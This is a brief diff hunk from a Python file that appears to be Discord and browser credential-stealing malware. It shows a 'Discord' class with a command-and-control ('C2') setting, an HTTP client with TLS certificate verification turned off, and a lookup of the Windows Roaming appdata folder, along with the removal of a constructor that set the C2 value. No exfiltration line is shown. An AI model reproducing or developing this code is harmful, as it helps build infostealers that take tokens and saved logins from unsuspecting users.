@@ -625,8 +625,6 @@ class Browsers:
 
 class Discord:
     C2 = [0, ""]
-    def __init__(C2):
-        Discord.C2 = C2
 
     httpClient = PoolManager(cert_reqs="CERT_NONE") # Client for http requests
     ROAMING = os.getenv("appdata") # Roaming directory
